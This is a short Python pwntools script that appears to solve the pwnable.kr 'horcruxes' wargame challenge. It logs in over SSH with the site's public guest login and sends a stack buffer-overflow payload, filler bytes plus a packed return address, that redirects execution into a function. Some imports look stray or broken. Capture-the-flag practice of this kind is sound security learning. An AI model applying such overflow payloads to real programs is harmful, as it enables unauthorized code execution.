from http.server import executable
import imp
from pwn import *
# import logging

ROPME_FUNC_ADDR = 0x080a0009

buff_overflow = ("1" * 0x74).encode() + p32(ROPME_FUNC_ADDR + 59)
print(buff_overflow)

# logging.info("Horcruxes challenge!")

# context.terminal = ["tmux", "splitw", "-h"]

prog = ssh("horcruxes", "pwnable.kr", port=2222, password="guest").process("./horcruxes")
# prog = process("./horcruxes")


# gdb.attach(prog, gdbscript='''
#     set follow-fork-mode child
#     b *(ropme++229)
#     b *(ropme+365)
#     continue
#     ''')

print(prog.recv().decode())
# prog.interactive()
prog.sendline("5423")
print(prog.recv().decode())


prog.sendline(buff_overflow)

print(prog.recv().decode())

prog.close()